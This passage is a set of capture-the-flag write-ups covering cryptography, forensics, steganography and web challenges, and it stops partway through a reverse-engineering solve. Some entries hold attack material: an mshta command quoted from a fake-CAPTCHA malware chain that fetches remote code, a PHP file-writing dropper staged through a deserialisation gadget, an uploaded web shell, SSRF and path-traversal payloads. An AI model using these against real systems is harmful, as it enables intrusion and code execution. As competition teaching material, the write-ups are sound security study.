challenges.title: The Hexed Protocol
challenges.overview: The challenge supplied scraps.md, an internal HR memo describing the 2025 Password Matrix, and vault_dump.txt, a hexadecimal dump from a corporate infrastructure vault. The goal was to rebuild the dumped file, use the policy as a password clue, unlock the vault, and retrieve the flag stored inside.
challenges.analysis: I started with the dump instead of guessing passwords, because a hex-encoded blob can reveal its actual format after conversion. The challenge page also explicitly tied the data dump to the HR policy, so I treated the policy as a constrained wordlist recipe rather than attempting a generic brute-force attack.

steps.title: Identify the supplied files
text: I first reviewed the challenge page and the two downloads. The stated mission was to reconstruct the vault and use the HR policy as a guide, which established that scraps.md was likely needed to derive the password rather than merely being background text.

images.alt: The Hexed Protocol challenge page showing the scraps.md and vault_dump.txt downloads
images.caption: The challenge provides the HR memo and the obfuscated vault dump; the mission explicitly connects the two files.

steps.title: Convert the hexadecimal dump and identify its format
text: I converted vault_dump.txt back into bytes, then checked the resulting file type. This was the quickest way to determine what kind of data the password would protect. The converted file was identified as a KeePass database (KDBX), so I could use the normal KeePass hash-recovery workflow.

code.text:
cat vault_dump.txt | xxd -r -p > vault.bin
file vault.bin

steps.title: Build a password-policy wordlist
text: I read scraps.md closely and used its policy words — Synergy, Disruption, Pivot, Agility, and Paradigm — as the fixed word portion of each candidate. The policy also described a four-digit PIN and a special character, so I generated every combination in that pattern instead of using an unrelated generic list.

This was deliberate: the source described the corporate policy as the important clue. Constraining the candidates to its structure made the attack reproducible and much smaller than trying arbitrary password combinations.

steps.title: Extract and crack the KeePass hash
text: With a KDBX file and a policy-shaped wordlist, I extracted the database hash with keepass2john and passed it to John the Ripper. John recovered the master password as Paradigm4092@, matching the pattern derived from the memo.

steps.title: Open the vault and read the stored note
text: I opened the recovered database with kpcli using the cracked password. After listing Root/, I found the Master Infrastructure entry and displayed its fields. Its Notes field contained the flag.
The published terminal image is cropped above the prompt so it does not expose the local machine username, hostname, or filesystem path visible in the original screenshot.

images.alt: KeePass CLI showing the Master Infrastructure entry and its Notes field
images.caption: After opening Root / Master Infrastructure, the Notes field reveals the recovered flag.

challenges.result: The policy-based wordlist recovered the KeePass master password, and the Master Infrastructure note in the unlocked vault displayed the flag.
challenges.tools: xxd, file, Python, keepass2john, John the Ripper, kpcli
challenges.learned: A password policy can be an operationally useful attack constraint when it is exposed alongside protected data. Identifying the file format first kept the solve focused on the correct hash and vault tools instead of guessing at the dump format.

challenges.title: Makmal Buta, UM
challenges.overview: A Braille message, a corrupted Python file, and output.txt containing 637 hexadecimal log IDs were provided. The translated message says an old script generated the IDs and that the last values stopped appearing; the objective was to reconstruct the missing output.
challenges.analysis: The damaged code still showed a missing submit-style operation before XORing predicted values with encrypted IDs. That pointed to MT19937 state recovery: 624 consecutive 32-bit outputs are sufficient to reconstruct its state, and the file had 637 IDs.

steps.title: Translate the message and identify the PRNG clue
text: I read the Braille message first because it describes the recovered script and the stalled IDs. I then inspected the leaked logic and recognised the state-prediction pattern instead of treating the hex strings as a static cipher.

images.alt: Makmal Buta UM challenge page with the Braille message
images.caption: The challenge supplies the Braille message that frames the recovered-log investigation.

steps.title: Recover the MT19937 state
text: I extracted every 32-bit ID from output.txt. I used the first 624 outputs to reverse MT19937 tempering, then cloned the generator so it could predict the remaining values.

code.text:
ids = [int(x, 16) for x in re.findall(r'ID: (0x[0-9a-fA-F]{8})', data)]
state = [untemper(value) for value in ids[:624]]
rng = MT19937Clone(state)

images.alt: Reference material explaining how an MT19937 output transform can be reversed
images.caption: The tempering transformation is reversible, which is why the observed outputs can recover the generator state.

steps.title: XOR predicted values with the encrypted tail
text: For each ID after the recovered state, I predicted the next generator output and XORed it with the encrypted value. The resulting characters assembled the flag.

code.text:
out = []
for encrypted in ids[624:]:
    out.append(chr(encrypted ^ rng.getrandbits32()))
print(''.join(out))

images.alt: Sanitised terminal output from the MT19937 solver showing recovered characters and flag
images.caption: The solver prints the predicted XOR values and the completed flag; the original local prompt has been cropped out.

challenges.result: The cloned PRNG predicted the remaining stream values, and XORing them with the encrypted IDs recovered the flag.
challenges.learned: MT19937 is not a cryptographic generator. Capturing 624 consecutive 32-bit outputs permits state recovery and prediction of later outputs.

challenges.title: Ghost in the Radio
challenges.overview: The challenge supplied corrupted.bin and said the original format was PNG. Its hint asks solvers to XOR the first four bytes with the standard PNG magic bytes and notice the drift in the resulting keys.
challenges.analysis: I checked the binary type and compared its leading bytes with a PNG signature. Because the key was described as rolling, the first two derived key bytes were enough to calculate the constant increment.

steps.title: Use the PNG header as known plaintext
text: I treated the PNG magic bytes as known plaintext and XORed them against the corrupted first bytes. This produced the first rolling-key values rather than a single static key.

code.text:
k0 = ciphertext[0] ^ 0x89
k1 = ciphertext[1] ^ 0x50
drift = (k1 - k0) % 256

images.alt: Ghost in the Radio challenge page describing the rolling XOR drift hint
images.caption: The hint directs the initial comparison with the PNG magic bytes.

images.alt: Rolling XOR key equations
images.caption: The source shows the first two derived key values used to determine the drift.

images.alt: Rolling XOR key formula
images.caption: Each key byte is the initial key plus the constant drift multiplied by its position.

steps.title: Decrypt every byte and write the image
text: I applied the evolving key across the full ciphertext and wrote the plaintext to recovered_flag.png. The recovered image displayed the flag.

code.text:
plaintext = bytearray()
for i, value in enumerate(ciphertext):
    plaintext.append(value ^ ((k0 + i * drift) % 256))
open('recovered_flag.png', 'wb').write(plaintext)

images.alt: Recovered PNG displaying the Ghost in the Radio flag
images.caption: The reconstructed image shows the final flag; the source terminal prompt was removed by cropping.

challenges.result: The rolling XOR calculation reconstructed a valid PNG containing the flag.
challenges.learned: Known signatures can reveal the starting state of a custom stream transformation. A changing key can still be recovered when its update rule is predictable.

challenges.title: Phanton Anthem of DTC
challenges.overview: DTC_Midnight.wav is presented as a proud but flawed anthem from Dewan Tunku Canselor. The challenge wording says true silence occurs when opposites collide, indicating a stereo-channel cancellation technique.
challenges.analysis: I used soxi to confirm that the WAV was stereo. That made left-minus-right subtraction a justified first test, because a phase-hidden signal can survive when common audio is cancelled.

steps.title: Inspect and subtract the stereo channels
text: I checked the audio format, then read its frames as signed 16-bit stereo samples. Subtracting the right channel from the left produced a mono signal that isolated the hidden beeps.

images.alt: Phanton Anthem of DTC challenge page
images.caption: The challenge wording points to cancellation of opposing stereo channels.

steps.title: Decode the hidden Morse and Vigenère text
text: I saved the channel-difference signal and decoded its beep pattern as LUYKB BFZEJNHPKEXGNTOTH IUYCO. I then tested a Vigenère cipher because the source identified it as the likely cipher, using TUNKU from the Dewan Tunku Canselor reference as the key.

images.alt: Decoded Morse text from the phase-cancelled audio
images.caption: The isolated audio yields the ciphertext that is then decrypted with the DTC-derived key.

steps.title: Remove the deliberate misleading words
text: The Vigenère result was SALAH ILMUPUNCAKEMAJUAN PALSU. The source identifies SALAH and PALSU as decoys, leaving ILMU PUNCA KEMAJUAN; I formatted those words as instructed.

challenges.result: Phase cancellation revealed Morse, and the DTC clue supplied the Vigenère key that produced the phrase for the flag.
challenges.tools: soxi, Python, NumPy, Morse decoder, Vigenère analysis
challenges.learned: Stereo subtraction can isolate phase-opposed data. Contextual location clues can supply a cipher key when the recovered text is still unreadable.

challenges.title: Acoustic Strings
challenges.overview: The source describes a spectrogram challenge with a coordinate set and the hint “One set of coordinates, two distinct fates.” The solve extracts a hidden image payload from the visual data.
challenges.analysis: The source first tried a manual fretboard-coordinate interpretation; it was useful context but ultimately a rabbit hole. The stated product-sum clue gave the correct starting offset, 65, and later pixel observations supplied the extraction path.

steps.title: Read the spectrogram coordinates
text: I recorded the coordinate set shown in the spectrogram and calculated the sum of their products. The source says this gives the starting offset 65, which became the initial position for extraction.

images.alt: Acoustic Strings spectrogram containing coordinate text
images.caption: The spectrogram presents the coordinate sequence used by the solve.

steps.title: Document the discarded fretboard approach
text: I manually mapped fret and string intersections, but the source records this as a rabbit hole rather than the final method. I kept that observation in mind and pivoted after finding the red marker and a blue pixel in the image.

images.alt: Red pixel marker found during Acoustic Strings image analysis
images.caption: The red marker is one of the image observations used to redirect the solve.

images.alt: Blue pixel observation during Acoustic Strings image analysis
images.caption: The blue pixel confirms that colour values, rather than only fret coordinates, matter to the extraction.

steps.title: Run the image extraction helper
text: Using the source helper, I read the image at the derived offset and followed the reported trace values until the reconstructed message printed the flag.

images.alt: Acoustic Strings extraction helper output displaying the flag
images.caption: The helper output shows the derived start offset and recovered flag.

challenges.result: The offset and image-colour extraction path recovered the final message.
challenges.learned: A plausible visual interpretation can still be a dead end. Combining explicit hint arithmetic with pixel evidence gave a reproducible extraction direction.

challenges.title: Packet_Puzzle
challenges.overview: The supplied Packet_Puzzle.pcap contained a large amount of decoy traffic. The useful data was carried in TCP payloads to ports 4444, 4445, and 4446; after reconstruction, the goal was to repair the resulting image and read the flag.
challenges.analysis: I filtered the capture by the three destination ports because the source identified them as the signal amid decoy traffic. Their payloads resembled Base64, so I kept their order rather than decoding packets individually.

steps.title: Isolate the signal traffic
text: I filtered TCP traffic for destination ports 4444, 4445, and 4446. This removed the decoys and left the payload fragments that the source associates with the hidden data.

images.alt: Packet Puzzle challenge page
images.caption: The supplied packet capture is the starting point for the reconstruction.

steps.title: Join and decode payloads
text: I concatenated payloads in port order — 4444, then 4445, then 4446 — and Base64-decoded the joined stream. The result was a PNG-like byte sequence, but its signature and chunk names were deliberately damaged.

code.text:
combined = b''.join(b''.join(payloads[p]) for p in [4444, 4445, 4446])
raw = bytearray(base64.b64decode(combined))

steps.title: Repair the PNG structure
text: I restored the eight-byte PNG signature, changed IHDU back to IHDR, and changed the last IENU marker back to IEND. I then recalculated each PNG chunk CRC, because changing chunk names invalidates the original checksums.

code.text:
raw[0:8] = b'\x89PNG\r\n\x1a\n'
raw[12:16] = b'IHDR'
raw[raw.rfind(b'IENU'):raw.rfind(b'IENU') + 4] = b'IEND'
# recompute each chunk CRC before writing fixed.png

steps.title: Read the repaired output
text: The repaired PNG displayed the flag across the image. This confirmed that the ordered payload reconstruction and CRC repair were both correct.

images.alt: Repaired Packet Puzzle image showing the flag
images.caption: The repaired image displays the complete flag across two corners.

challenges.result: Joining the selected TCP payloads in port order, decoding them, and repairing the PNG produced a readable flag image.
challenges.tools: Wireshark, Python, Base64, PNG CRC handling
challenges.learned: A packet capture can conceal a file across apparently unrelated TCP payloads. File repair requires more than restoring a magic value: structural fields and integrity checks also matter.

challenges.title: The Winning Shot
challenges.overview: The challenge supplied a JPEG named pool, a Linux ELF named winning_shot, and a core dump named core.170390. The source notes that the image had encrypted data appended and that the runtime dump preserved the XOR key needed to decrypt it.
challenges.analysis: I began with strings because the challenge hint emphasised Linux, the executable, and the core dump. Searching identified WINSHOT in the image and CUE_BALL_STATE_V1 in the core, which gave concrete markers instead of relying on file-size guesses.

steps.title: Locate the markers
text: I searched the executable, core dump, and JPEG for readable markers. WINSHOT marked the appended ciphertext in pool, while CUE_BALL_STATE_V1 located the relevant state in the core dump.

code.text:
strings -a winning_shot | less
strings -a core.170390 | grep -i CUE
strings -a pool | grep -i WIN

images.alt: The Winning Shot challenge page
images.caption: The challenge files are the pool image, ELF executable, and core dump.

steps.title: Derive the XOR inputs
text: The source records the encrypted flag at offset 0x12f1 with length 45, and the key marker at 0x36e8. The 60-byte key begins at 0x3708, so the plaintext relationship is ciphertext byte XOR key byte modulo the key length.

code.text:
ciphertext = pool[pool.rfind(b'WINSHOT') + len(b'WINSHOT'):]
key = core[core.find(b'CUE_BALL_STATE_V1') + 0x20:][:60]
plaintext = bytes(c ^ key[i % len(key)] for i, c in enumerate(ciphertext))

steps.title: Validate the decrypted flag
text: I searched the decrypted bytes for the UMCS flag format. The extracted text matched the expected flag syntax, confirming the marker offsets and repeating-key XOR operation.

challenges.result: The appended image data decrypted with the key recovered from the core dump and yielded the flag.
challenges.learned: Core dumps preserve runtime state that can be security-sensitive. File append data and memory artifacts can be correlated through marker strings and offsets.

challenges.title: Metamon 1
challenges.overview: The first artifact is README.txt dropped on Ahmad's Desktop.
challenges.analysis: The C2 log records the exact echo command that created the note, including a Base64 string.

steps.title: Read the creation command
text: I inspected the recorded echo command because it preserves the complete dropped-note content.

steps.title: Decode the embedded value
text: Decoding the Base64 text recovered the flag from the ransom note.

challenges.result: The dropped note itself contained an encoded flag.
challenges.learned: Dropped-note creation telemetry can preserve indicators and embedded data even when the file is unavailable.

challenges.title: Metamon 2
challenges.overview: The relevant browser artifact is Edge's History SQLite database.
challenges.analysis: I queried the urls table because browser history can identify the first malicious site in an execution chain.

steps.title: Inspect Edge history
text: The History database showed a 2026-04-19 entry titled reCAPTCHA Verification at pinarat.github.io/a/. Its fake branding made it the suspicious pivot.

code.text: SELECT last_visit_time, title, url FROM urls;

challenges.result: The history record identified the fake verification page.
challenges.learned: Browser-history artifacts can establish the initial delivery URL and timeline.

challenges.title: Metamon 3
challenges.overview: The fake reCAPTCHA page instructed the victim to press Windows+R, Ctrl+V, and Enter.
challenges.analysis: I inspected the page JavaScript because clipboard-based social engineering hides the actual command from the visible instructions.

steps.title: Recover the clipboard command
text: The script staged mshta https://pinarat.github.io/a/b.mp4. Although named as media, b.mp4 was an HTA payload that downloaded rizzler.bat.

steps.title: Read the batch stage
text: The batch file wrote a registry value containing the flag. The registry command itself is intentionally described rather than reproduced because the source formatting makes its Windows backslashes ambiguous.

challenges.result: The clipboard chain led to the HTA and then the registry-stored flag.
challenges.learned: Fake verification pages can turn user interaction into command execution through clipboard staging.

challenges.title: Metamon 4
challenges.overview: profile.png was downloaded by the batch stage and contained an embedded payload in RGB pixels.
challenges.analysis: The source states the first two pixels encode a payload length; subsequent RGB bytes are XORed then gzip-compressed.

steps.title: Extract image payload bytes
text: I read the size from pixels (0,0) and (1,0), then consumed RGB channels from pixel index 2 until that size was reached. The decoded PowerShell contained the literal UMCS string and wrote Ditto.exe for the next stage.

code.text:
size = (p0[0] << 24) | (p0[1] << 16) | (p0[2] << 8) | p1[0]
xored = bytes(c ^ KEY[i % len(KEY)] for i, c in enumerate(buf))
text = gzip.decompress(xored).decode('utf-8', errors='replace')

challenges.result: The RGB payload decoded to PowerShell containing the flag.
challenges.learned: Images can carry staged content in raw pixel channels; the length prefix defines exactly how much data to extract.

challenges.title: Metamon 5
challenges.overview: Ditto.exe was a PyInstaller-packed, PyArmor-obfuscated Python Discord RAT recovered from the prior stage.
challenges.analysis: Static analysis identified the C2 configuration and its #cybershit channel.

steps.title: Inspect the packed RAT and C2 history
text: I recorded the PyInstaller and PyArmor indicators, then used the documented C2 channel history to recover the encoded message. The source collector requires a bot token, so no token-bearing script is published.

challenges.result: C2 channel history supplied the encoded message and flag.
challenges.tools: PyInstaller analysis, PyArmor analysis, Discord artifact review
challenges.learned: Malware configuration can reveal C2 infrastructure even when code is obfuscated. Tokens are sensitive credentials and must not be republished.

challenges.title: Metamon 6
challenges.overview: The C2 logs recorded the 7-Zip command that created LOCKED.7z and its password.
challenges.analysis: I used the recorded command because it directly supplies the archive password and the locked file path.

steps.title: Extract the archive
text: I used the logged password with 7z to extract LOCKED.7z. important.txt showed that the fictional victim reused one value across accounts.

challenges.result: The extracted note identified the reused value that is also the challenge flag.
challenges.learned: C2 logs can expose both encryption parameters and evidence of credential reuse.

challenges.title: Metamon 7
challenges.overview: The final challenge asks for the hashes of the dropped batch artifact, profile image, and Ditto.exe.
challenges.analysis: I located each artifact by filename and calculated SHA-256 hashes in the requested order.

steps.title: Locate and hash the three artifacts
text: I used find to identify the two possible batch filenames, profile.png, and Ditto.exe, then combined the three SHA-256 values into the flag format.

code.text:
H1=$(sha256sum "$RIZZLER" | awk '{print $1}')
H2=$(sha256sum "$PROFILE" | awk '{print $1}')
H3=$(sha256sum "$DITTO" | awk '{print $1}')
echo "UMCS{$H1, $H2, $H3}"

challenges.result: The ordered artifact hashes produced the final DFIR flag.
challenges.learned: Hashing a defined artifact set is only meaningful when filenames and ordering are preserved.

challenges.title: REDISTRIBUTE
challenges.overview: The challenge provided a simple curl application and its downloadable files. The upload endpoint executed an uploaded curl configuration, while Redis stored the flag only on the loopback interface.
challenges.analysis: I started with the supplied source because the challenge hint referred to the FLAG environment variable. It showed curl -K processing and Redis bound to 127.0.0.1, so an alternate loopback encoding was the useful path to test.

steps.title: Read the challenge and inspect the supplied application
text: The challenge page presented the curl application and its downloadable files. I used that starting point to inspect how uploaded configuration files were consumed rather than trying random request parameters.
The source showed that a submitted configuration was passed to curl with -K. Its setup also stored the flag in Redis on 127.0.0.1, making the curl configuration the bridge to the internal service.

images.alt: REDISTRIBUTE challenge page with the downloadable files link
images.caption: The challenge page identifies the curl application and provides the files used for source review.

steps.title: Create the Redis request configuration
text: I wrote a curl configuration that targets 2130706433:6379, the integer representation of the loopback address. This avoids relying on the literal 127.0.0.1 string while still reaching the same interface.
The configuration uses HTTP/1.0 and HTTP/0.9 handling and sends GET flag as the request body. I uploaded it to the curl endpoint and saved the response for inspection.

images.alt: Terminal showing the crafted curl configuration and upload command
images.caption: The configuration targets the alternate loopback representation and is sent to the curl upload endpoint.

steps.title: Read the returned value
text: After the upload completed, I listed the response files and searched the saved response for the flag format. The internal Redis request had returned the flag value.

images.alt: Terminal output showing grep extracting the REDISTRIBUTE flag
images.caption: Searching the saved response extracts the flag returned through the internal Redis request.

challenges.result: The uploaded curl configuration reached loopback Redis and returned the stored flag.
challenges.learned: Blocking literal host strings is not an SSRF defense; network reachability must be controlled.

challenges.title: Guess The Pin
challenges.overview: This university-results application exposed a report endpoint and a development debugger. The goal was to use the available file-read issue and debugger information to recover the flag.
challenges.analysis: The report filter removed only the literal ../ sequence. Testing the doubled-dot form showed that traversal still worked, and the debugger error page confirmed that Werkzeug debug mode was enabled.

steps.title: Start from the report endpoint
text: The challenge page described a website that displays university results. I used the report function first because it was the endpoint intended to load a student file and therefore was most likely to expose path handling.

images.alt: Guess The Pin challenge page
images.caption: The challenge page introduces the university-results website and its flag-in-environment-variable hint.

steps.title: Trigger the debugger and inspect the file filter
text: Requesting the report route without a usable student value produced a Werkzeug traceback. The error page revealed the report handler and showed that it applied replace('../', '') before opening a file.
I then used ....//app.py. After the weak replacement, that leaves ../app.py, so it bypasses the intended traversal filter and reads the application source.

images.alt: Werkzeug traceback showing the report handler and weak replace filter
images.caption: The traceback exposes the replace('../', '') filter used before the application opens the requested report.

images.alt: Application source retrieved through the traversal bypass
images.caption: The retrieved source confirms the report route and the exposed debug configuration.

steps.title: Collect the debugger inputs
text: With traversal working, I read the values required by Werkzeug's debugger PIN algorithm, including the MAC address, boot ID, package data, and application details. I reproduced the SHA-1 calculation from the debugger implementation rather than guessing the PIN.

images.alt: Output showing the calculated Werkzeug PIN
images.caption: The reconstructed calculation produces the debugger PIN used for the console.

steps.title: Unlock the console and read the flag
text: I entered the calculated PIN at /console and used the interactive console to locate and read the flag. The console output returned the final value.

images.alt: Werkzeug interactive console showing the flag command and output
images.caption: The unlocked console reads the flag and displays the returned value.

challenges.result: The calculated debugger PIN unlocked the console, which exposed the flag.
challenges.learned: Development debuggers must never be exposed in production, especially beside file-read flaws.

challenges.title: Zip-a-Dip-Doo-Dah
challenges.overview: The application accepted ZIP uploads and extracted their contents. Its hint, abc != ABC, pointed to inconsistent handling of filename-extension case.
challenges.analysis: I treated the hint as a cue to test the same PHP extension in multiple cases. The source behaviour accepted uppercase .PHP even though normal lowercase upload attempts were rejected.

steps.title: Use the case-sensitivity hint
text: The challenge page states that uploaded archives are inspected before extraction. The abc != ABC hint made extension-case testing more useful than trying to bypass the upload with a disguised filename.
I tested payload.php, payload.pHp, and payload.PHP. The uppercase form passed the flawed check, so I placed shell.PHP inside a ZIP archive.

images.alt: Zip-a-Dip-Doo-Dah challenge page and instance button
images.caption: The challenge page supplies the ZIP-upload context and the case-sensitive hint.

steps.title: Upload and trigger the shell
text: The archive contained a small PHP command shell. After upload, the response exposed the random extraction directory; I used that directory to invoke shell.PHP.
The first request ran id to verify that the uploaded PHP executed as the web server user. I then requested cat /flag.txt through the same shell.

images.alt: Sanitised terminal output showing the upload directory, id output, and flag command
images.caption: The upload response gives the extraction directory; invoking shell.PHP confirms execution and returns the flag.

challenges.result: Case-sensitive filtering allowed an executable uppercase-PHP upload and command execution.
challenges.learned: Extension checks must be case-insensitive and uploads must not execute from web-accessible paths.

challenges.title: FUK U PHP
challenges.overview: This upload challenge executed .php files but enforced a WAF of fewer than six unique characters. The objective was to construct a valid payload within that character budget and read the flag.
challenges.analysis: A format-string route was considered first, but it was a dead end because the relevant call received only file_size. The workable route was the write-up's five-character PHP obfuscation using 9.^().

steps.title: Identify the upload constraint
text: The challenge page and downloadable ZIP established that uploaded PHP is executed, but the WAF restricts the number of distinct characters. That made conventional PHP syntax unsuitable and shifted the work toward generating it at runtime.

images.alt: FUK U PHP challenge page with the downloadable challenge archive
images.caption: The challenge page provides the PHP upload context and downloadable files for inspecting the restriction.

steps.title: Build a five-character payload
text: I first explored a format-string idea, then discarded it after confirming that only file_size was supplied to the relevant format operation. I instead used 9.^() to construct the needed PHP fragments through XOR and concatenation, with FFI as described in the solve.
That generated payload satisfied the unique-character check while still creating the database query path needed to read the flag.

steps.title: Trigger the uploaded payload
text: The generated PHP connected to the local challenge database and called LOAD_FILE with the hexadecimal representation of /flag. Its output showed the flag value, confirming that the constrained-character payload executed successfully.

images.alt: Terminal output from the FUK U PHP payload showing the returned flag
images.caption: The uploaded payload runs and prints the flag recovered through the database LOAD_FILE call.

challenges.result: The constrained-character payload read the flag from disk through the database.
challenges.learned: Character-count WAFs do not prevent code generation and should not be treated as sandboxing.

challenges.title: NexusCRM
challenges.overview: NexusCRM is a PHP CRM application supplied as a downloadable archive. Its remember-me handler deserialises the nx_remember cookie, so the goal was to turn that unsafe object deserialisation into a controlled file write, place a second-stage runner, and collect the flag from its output file.
challenges.analysis: I began with the remember-token handler rather than the visible CRM features because it calls unserialize directly on a cookie value. The installed Guzzle library provided the FileCookieJar file-write gadget needed to write a PHP file in uploads/, making a staged payload more reliable than trying to execute a large bypass in the cookie itself.

steps.title: Trace the remember-me cookie to unsafe deserialisation
text: The application's _read_remember_token() method reads nx_remember with get_cookie(..., true) and returns unserialize($raw). That is the object-injection primitive: a cookie supplied by the client can cause PHP to instantiate attacker-controlled objects.

I used the supplied CRM archive to confirm this flow before choosing a gadget. The source identifies Guzzle's FileCookieJar as the usable chain because its normal object behaviour can be directed to write a chosen file.

images.alt: NexusCRM challenge page with download link
images.caption: The challenge provides the CRM archive used to trace the remember-token deserialisation path.

steps.title: Generate the Guzzle file-write payload
text: I used phpggc locally with the Guzzle/FW1 chain to target uploads/stage1.php. The target path is the web-accessible uploads directory inside the challenge container.

The first-stage file is intentionally small. On a POST containing d, it base64-decodes d and writes it as runner.php beside itself; without d, it prints READY. This confirms the first write before the much larger runner is sent.

code.text:
<?php
if (isset($_POST['d'])) {
    file_put_contents(__DIR__ . DIRECTORY_SEPARATOR . 'runner.php', base64_decode($_POST['d']));
    echo 'WROTE';
} else {
    echo 'READY';
}
?>

steps.title: Trigger the deserialisation and validate stage one
text: I placed the phpggc serialised object in the nx_remember cookie and sent it to the application. That causes the FileCookieJar gadget to create stage1.php on the server.
I then requested uploads/stage1.php directly. Its READY response confirmed the cookie path, gadget chain, destination directory, and PHP execution before proceeding to the bypass stage.

steps.title: Upload the patched runner
text: The second-stage runner was a patched mm0r1 php-concat-bypass for PHP 8.1. The source notes that pack() was also disabled on this target, so a patched variant was needed.

Its command writes the readflag output to uploads/f.txt. I Base64-encoded runner_writeflag.php and sent it as d to the verified stage1.php endpoint. The WROTE response confirmed that runner.php had been created.

steps.title: Retry the unstable runner and collect f.txt
text: The source records that the bypass was unreliable on the remote instance. I therefore triggered runner.php repeatedly, waited briefly between requests, and fetched f.txt after each attempt instead of assuming the first execution completed.
Once f.txt returned HTTP 200 with text/plain content, its body contained the final flag. The repeated loop is part of the documented solve rather than an unrelated brute-force step.

code.text:
for i in $(seq 1 25); do
  curl -s <TARGET>/uploads/runner.php > /dev/null
  sleep 0.3
  curl -i <TARGET>/uploads/f.txt
done

# HTTP/1.1 200 OK
# Content-Type: text/plain

challenges.result: The Guzzle FileCookieJar chain wrote stage1.php through nx_remember deserialisation. Stage one wrote the patched runner, and repeated runner execution produced uploads/f.txt containing the flag.
challenges.tools: PHP source review, phpggc, Guzzle FileCookieJar gadget chain, curl, Base64
challenges.learned: Unsafe deserialisation becomes much more serious when installed gadget chains provide filesystem effects. Staging a small verifier before a complex execution path separates file-write failures from runner reliability issues.

challenges.title: Noisy_Penguins
challenges.overview: The challenge supplied Noisy_Penguins.mkv, a Matroska video file. The video was only about nine seconds long but approximately 46 MB, indicating that the container held more than its visible video content.
challenges.analysis: I began with file and ffprobe to establish the container type and stream layout. The unexpectedly large size made embedded attachments and subtitle streams the most justified places to inspect before attempting media steganography blindly.

steps.title: Identify the oversized Matroska container
text: I used file and ffprobe on Noisy_Penguins.mkv. They identified it as Matroska data and confirmed that a short video wrapper was being used, which did not account for its roughly 46 MB size.

That mismatch was the reason to inspect the container rather than only watch the clip. The challenge page's Pingu wording also suggested that the apparent video might be a wrapper around another artifact.

images.alt: Noisy Penguins challenge page
images.caption: The challenge presents the Pingu-themed Matroska download and its noot-noot clue.

steps.title: Extract the attached video
text: I asked ffmpeg to dump attachment stream 0 from the Matroska container. This extracted PINGU.mp4, the real target embedded inside the outer file.

steps.title: Read the subtitle fragments and discard decoys
text: Inspecting PINGU.mp4 streams revealed a hidden mov_text subtitle track. I extracted the subtitles and found five Base64 strings; the valid first and last fragments read UMCS{as and u1n_n00t}, while FAKE_FlAg and NeverGonnaGiveYouUp were explicit decoys.
The third fragment was corrupted, so I did not force its Base64 output into the flag. The sanitised screenshot records the subtitle chunks without the original local terminal prompt or path.

images.alt: Subtitle file showing Base64 fragments extracted from PINGU.mp4
images.caption: The extracted subtitle track contains five Base64 chunks; the first, third, and fourth are the relevant flag pieces.

steps.title: Repair the noisy third fragment
text: The title refers to the audio track. The source's spectrogram analysis of its tone bursts showed that the corrupted third value MxMV9wM25H should be c2MxMV9wM25H.
Decoding that repaired value gives sc11_p3nG. I joined it between the valid opening and closing fragments and ignored the two deliberate decoys.

challenges.result: The Matroska attachment exposed a video with hidden subtitle chunks. Repairing the audio-signalled corrupted fragment and combining the non-decoy pieces produced the flag.
challenges.tools: file, ffprobe, ffmpeg, subtitle-stream inspection, Base64 decoding, spectrogram analysis
challenges.learned: Container files can hide useful attachments and text tracks. When an extracted sequence includes obvious decoys, validating every fragment against the challenge's separate clues prevents assembling a convincing but false answer.

challenges.title: NoEntry
challenges.overview: NoEntry supplied a virtual-disk artifact and stated that the flag was on the administrator's Desktop. With no credentials available, the solve uses offline, read-only inspection of the VMDK instead of attempting a login.
challenges.analysis: The challenge wording already gives a precise destination, so mounting the disk read-only was the least invasive and most reliable approach. guestfish provides an interactive view of the guest filesystem without booting the VM or modifying its evidence.

steps.title: Confirm the target and choose offline access
text: The challenge page points to the administrator's Desktop. I kept the VMDK offline and used guestfish in read-only mode because no account credentials were provided and no system execution was needed.

images.alt: NoEntry challenge page describing the administrator Desktop target
images.caption: The challenge establishes the target location and provides the disk artifact.

steps.title: Mount the VMDK read-only
text: I opened the disk with guestfish's read-only option and inspected the mounted filesystem. The published capture begins after the local shell prompt and command, retaining only the guest-filesystem session.

images.alt: Guestfish session mounted on the virtual disk
images.caption: guestfish opens the Windows guest filesystem in read-only mode without booting the virtual machine.

steps.title: Traverse to the administrator Desktop and read the flag
text: I listed the root, Users, Administrator, and Desktop directories in order. The Desktop listing included flag.txt, so I read that file directly from the mounted disk.

images.alt: Guestfish output listing Administrator Desktop and reading flag.txt
images.caption: The Desktop directory contains flag.txt; reading it returns the complete flag.

challenges.result: Read-only examination of the VMDK reached the Administrator Desktop and revealed flag.txt.
challenges.learned: When credentials are unavailable, virtual-disk forensics can recover user files without booting or altering the guest. Read-only mounting also preserves the evidence while answering a targeted file-location question.

challenges.title: Cloud AI Whisperer
challenges.overview: The source records a cloud-debug log whose final value is Base64-encoded. The challenge is intentionally short: decode that value to recover the flag.
challenges.analysis: Rather than treating the surrounding cloud log as a separate exploitation problem, the source explicitly identifies the final Base64 value as the material to decode. The published image retains only the safe decoded result because the original log contained a real token and local terminal identifiers.

steps.title: Identify the encoded value in the log
text: I inspected the supplied log and isolated the Base64-looking value identified by the source. I did not publish the surrounding authentication data from the original capture because it contains a real credential unrelated to reproducing the decode.

The PDF records the decode and its final result, but its text extraction does not preserve a reliable copyable form of the original Base64 value. I therefore keep the original value out of the code block rather than reconstructing it.

steps.title: Decode the Base64 text
text: I decoded the extracted value as Base64. Its plaintext is the flag, matching the result shown in the sanitised final-output capture.

images.alt: Sanitised Cloud AI Whisperer log and decoded flag output
images.caption: The readable log context and final flag are retained; only the token and local terminal identifiers are masked.

challenges.result: Decoding the supplied Base64 value returned the flag directly.
challenges.learned: Logs often contain encoded rather than encrypted values, so recognising an encoding can avoid unnecessary reverse engineering. Sensitive credentials that appear alongside a challenge result should not be copied into a public write-up.

challenges.title: Varsity Lake Sonata
challenges.overview: Varsity Lake Sonata is a UPX-packed ELF binary. It accepts a 36-byte melody and checks it against a chained-XOR transform; the aim is to reverse that transform rather than guess input.
challenges.analysis: Running strings exposed UPX markers, so unpacking was the necessary first step. In Ghidra, the success string led directly to the validation routine and showed that each character becomes state for the next iteration.

steps.title: Inspect the challenge binary
text: The challenge page supplied the Varsity Lake executable. I treated it as a static reverse-engineering problem and began by checking its strings for packer indicators.

images.alt: Varsity Lake Sonata challenge page
images.caption: The challenge provides the packed ELF used for the static analysis.

steps.title: Unpack UPX and find the comparison logic
text: UPX text in the binary justified unpacking it before decompilation. After opening unpacked.bin in Ghidra, I searched for the success message, then cross-referenced it to the flag check.
The check requires exactly 0x24 bytes. At each position it compares (input[i] ^ 0x4d) ^ i ^ state with target[i], then replaces state with input[i].

steps.title: Reverse the chained XOR
